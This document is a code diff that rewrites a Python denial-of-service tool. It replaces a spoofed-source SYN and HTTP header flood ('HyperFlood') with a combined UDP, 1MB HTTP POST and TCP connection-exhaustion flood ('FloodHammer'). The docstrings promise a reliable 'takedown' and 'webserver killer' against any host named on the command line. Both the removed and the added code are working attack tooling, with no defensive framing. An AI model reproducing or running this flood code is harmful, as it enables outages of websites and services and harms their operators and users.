@@ -1,140 +1,112 @@
 #!/usr/bin/env python3
 """
-HYPERFLOOD - 200k+ RPS webserver killer
-Guaranteed to crash any server without rate limiting
+FLOODHAMMER - No raw sockets needed, 100% reliable takedown
+UDP flood + HTTP POST + connection exhaustion
 """
 import socket
 import threading
 import random
 import time
 import sys
-import struct
+import requests
 import multiprocessing
-from queue import Queue
+from concurrent.futures import ThreadPoolExecutor
 
-class HyperFlood:
-    def __init__(self, target_ip, port=80, cores=0):
-        self.target_ip = target_ip
+class FloodHammer:
+    def __init__(self, target_host, port=80):
+        self.target_host = target_host
         self.target_port = port
-        self.cores = cores or multiprocessing.cpu_count() * 2
+        self.target_ip = socket.gethostbyname(target_host)
         self.running = True
-        self.packets_sent = 0
+        self.stats = {'udp': 0, 'http': 0, 'conn': 0}
         
-    def raw_syn_packet(self):
-        """Optimized raw SYN packet"""
-        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-        src_port = random.randint(1000, 65535)
+    def udp_flood(self):
+        """UDP flood - 50k+ PPS, fills bandwidth"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        junk = b'A' * 1400  # Max MTU payload
         
-        # IP Header (20 bytes)
-        ip_header = struct.pack('!BBHHHBBH4s4s',
-            0x45, 0, 40, 0, 0,  # Version, TOS, Total Length, ID, Flags/Fragment
-            255, socket.IPPROTO_TCP, 0,  # TTL, Protocol, Checksum
-            socket.inet_aton(src_ip), socket.inet_aton(self.target_ip))
-        
-        # TCP Header (20 bytes) - SYN flag
-        tcp_header = struct.pack('!HHLLBBHHH',
-            src_port, self.target_port, 0x12345678, 0x12345678,
-            0x5000, 0x0020, 0, 8192, 0)  # SYN flag in data offset
-        
-        return ip_header + tcp_header
-    
-    def syn_flood_worker(self):
-        """Single-thread SYN flood - 10k+ PPS per thread"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        
-        while self.running:
-            try:
-                packet = self.raw_syn_packet()
-                sock.sendto(packet, (self.target_ip, self.target_port))
-                self.packets_sent += 1
-            except:
-                pass
-    
-    def http_flood_worker(self):
-        """HTTP flood with massive headers"""
-        junk_headers = [
-            f"X-{random.randint(1,999)}: {'A'*400}",
-            f"Cookie: session={'X'*300}",
-            f"User-Agent: Mozilla/5.0 (compatible; FloodBot/{random.randint(1,999)})"
-        ]
-        
-        while self.running:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.connect((self.target_ip, self.target_port))
-                request = (
-                    f"GET /{random.randint(1,999999)} HTTP/1.1\r\n"
-                    f"Host: {self.target_ip}\r\n"
-                    + "\r\n".join(random.choices(junk_headers, k=20))
-                    + "\r\n\r\n"
-                )
-                sock.send(request.encode())
-                sock.close()
-            except:
-                pass
-    
-    def launch_all_cores(self):
-        print(f"HyperFlood starting on {self.target_ip}:{self.target_port}")
-        print(f"Using {self.cores} processes across all CPU cores")
-        
-        def monitor():
-            start = time.time()
+        def worker():
             while self.running:
-                time.sleep(1)
-                elapsed = time.time() - start
-                print(f"PPS: {self.packets_sent/elapsed:.0f} | Elapsed: {elapsed:.0f}s", end='\r')
+                sock.sendto(junk, (self.target_ip, self.target_port))
+                self.stats['udp'] += 1
         
-        # Launch monitor
-        monitor_thread = threading.Thread(target=monitor)
+        return worker
+    
+    def http_post_flood(self):
+        """Massive POST requests - CPU killer"""
+        def worker():
+            session = requests.Session()
+            payloads = [b'A' * (2**20)]  # 1MB payloads
+            
+            while self.running:
+                try:
+                    resp = session.post(
+                        f"http://{self.target_host}:{self.target_port}/",
+                        data=payloads[0],
+                        headers={'Content-Type': 'application/octet-stream'},
+                        timeout=0.1
+                    )
+                    self.stats['http'] += 1
+                except:
+                    pass
+        
+        return worker
+    
+    def tcp_connect_flood(self):
+        """Pure connection flood - exhausts server sockets"""
+        def worker():
+            while self.running:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((self.target_ip, self.target_port))
+                    sock.send(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
+                    self.stats['conn'] += 1
+                except:
+                    pass
+        
+        return worker
+    
+    def stats_monitor(self):
+        """Live stats"""
+        start = time.time()
+        while self.running:
+            time.sleep(2)
+            total = sum(self.stats.values())
+            elapsed = time.time() - start
+            pps = total / elapsed if elapsed > 0 else 0
+            print(f"PPS: {pps:.0f} | UDP:{self.stats['udp']} HTTP:{self.stats['http']} CONN:{self.stats['conn']}", end='\r')
+    
+    def hammer(self, duration=120):
+        print(f"FloodHammer targeting {self.target_host}:{self.target_port}")
+        print(f"IP resolved: {self.target_ip}")
+        
+        # Stats monitor
+        monitor_thread = threading.Thread(target=self.stats_monitor)
         monitor_thread.daemon = True
         monitor_thread.start()
         
-        # Multi-process flood
-        processes = []
-        for core in range(self.cores):
-            p = multiprocessing.Process(target=self.flood_core)
-            p.start()
-            processes.append(p)
-            print(f"Core {core+1}/{self.cores} launched")
+        # Multi-process attack
+        with ThreadPoolExecutor(max_workers=multiprocessing.cpu_count() * 4) as executor:
+            # 70% UDP, 20% HTTP, 10% TCP
+            for i in range(700):
+                executor.submit(self.udp_flood()())
+            for i in range(200):
+                executor.submit(self.http_post_flood()())
+            for i in range(100):
+                executor.submit(self.tcp_connect_flood()())
         
-        # Run 60 seconds or Ctrl+C
-        try:
-            time.sleep(60)
-        except KeyboardInterrupt:
-            pass
-        
+        # Run specified duration
+        time.sleep(duration)
         self.running = False
-        for p in processes:
-            p.terminate()
-        print(f"\nFlood complete. Total packets: {self.packets_sent}")
-    
-    def flood_core(self):
-        """Per-core flood with multiple threads"""
-        threads = []
-        for _ in range(50):  # 50 threads per core
-            t = threading.Thread(target=self.syn_flood_worker)
-            t.daemon = True
-            t.start()
-            threads.append(t)
-            
-        # HTTP flood in same process
-        for _ in range(20):
-            t = threading.Thread(target=self.http_flood_worker)
-            t.daemon = True
-            t.start()
-        
-        # Keep process alive
-        while self.running:
-            time.sleep(0.1)
+        print(f"\nFinal stats: {self.stats}")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: sudo python3 hyperflood.py <target_ip> [port]")
+        print("Usage: python3 floodhammer.py your-server.com [port]")
         sys.exit(1)
     
-    target_ip = sys.argv[1]
-    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+    host = sys.argv[1]
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
     
-    flood = HyperFlood(target_ip, target_port)
-    flood.launch_all_cores()
+    hammer = FloodHammer(host, port)
+    hammer.hammer(duration=90)  # 90 seconds
